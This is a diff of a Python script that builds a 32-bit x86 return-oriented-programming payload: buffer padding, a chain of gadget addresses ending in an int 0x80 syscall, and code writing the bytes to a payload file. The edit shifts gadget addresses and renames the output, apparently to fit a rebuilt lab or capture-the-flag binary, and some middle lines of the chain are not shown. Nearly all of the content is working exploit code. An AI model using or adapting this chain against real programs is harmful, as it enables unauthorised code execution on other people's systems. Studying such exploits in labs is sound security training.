@@ -1,18 +1,18 @@
 from struct import pack
 import os
 data = 0x080e5020
-xor_eax_eax = 0x08050a08 # xor eax, eax ; ret
-pop_eax = 0x080ac76a # pop eax ; ret
+xor_eax_eax = 0x080509f8 # xor eax, eax ; ret
+pop_eax = 0x080ac75a # pop eax ; ret
 pop_ebx = 0x08049022 # pop ebx ; ret
-pop_ecx = 0x08054f5b # pop ecx ; add al, 0xf6 ; ret
-pop_edx = 0x0808b285 # pop edx ; xor eax, eax ; pop edi ; ret
-inc_eax = 0x0809d0ae # inc eax ; ret
-int_80 = 0x080499b2 # int 0x80
-mov_edx_eax = 0x08080742 # mov dword ptr [edx], eax ; ret
-xor_edx_edx = 0x0807b179 # xor edx, edx ; mov eax, edx ; ret
+pop_ecx = 0x08054f4b # pop ecx ; add al, 0xf6 ; ret
+pop_edx = 0x0808b275 # pop edx ; xor eax, eax ; pop edi ; ret
+inc_eax = 0x0809d09e # inc eax ; ret
+int_80 = 0x080499a2 # int 0x80
+mov_edx_eax = 0x08080732 # mov dword ptr [edx], eax ; ret
+xor_edx_edx = 0x0807b169 # xor edx, edx ; mov eax, edx ; ret
 filler = 0x11111111
 # Padding goes here
-p = bytes('AAAA' * 4 + 'BBBB' * 1, 'ascii')
+p = bytes('AAAAAAAAAAAAAAAABBBB', 'ascii')
  
 p += pack('<I', pop_edx) # write address of .data into edx
 p += pack('<I', data)
@@ -50,5 +50,5 @@ p += pack('<I', inc_eax)
 p += pack('<I', inc_eax)
 p += pack('<I', int_80) # call interrupt
 print(str(p)[2:-1])
-with open('payload', 'wb') as file:
+with open('payload_debug', 'wb') as file:
     file.write(p)
